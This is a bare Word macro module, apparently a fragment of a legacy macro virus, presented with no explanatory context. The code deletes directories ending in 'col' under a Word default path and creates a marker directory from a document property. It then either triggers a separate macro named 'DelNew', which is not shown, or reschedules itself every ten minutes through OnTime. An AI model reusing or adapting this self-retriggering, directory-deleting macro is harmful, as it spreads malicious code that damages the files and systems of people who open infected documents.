   Attribute VB_Name = "one"

   Public Sub MAIN()
   Dim tmin
   Dim countdir
   Dim dircol$
   tmin = 10
   For countdir = 1 To WordBasic.CountDirectories(WordBasic.[DefaultDir$](2))
   If WordBasic.[Right$](WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir), 3) = "col" Then
   dircol$ = WordBasic.[GetDirectory$](WordBasic.[DefaultDir$](2), countdir)
   WordBasic.RmDir WordBasic.[DefaultDir$](2) + "\" + dircol$
   Else
   End If
   Next countdir
   WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\" + Str(WordBasic.GetDocumentProperty(WordBasic.[DocumentPropertyName$](20))) + ".col"
   If WordBasic.Val(dircol$) = WordBasic.GetDocumentProperty(WordBasic.[DocumentPropertyName$](20)) Then
   WordBasic.ToolsMacro Name:="DelNew", Run:=1
   Else
   WordBasic.OnTime WordBasic.[Left$](WordBasic.[Time$](), 3) + Str(WordBasic.Val(WordBasic.[Right$](WordBasic.[Time$](), 2)) + tmin), "one"
   End If
   End Sub
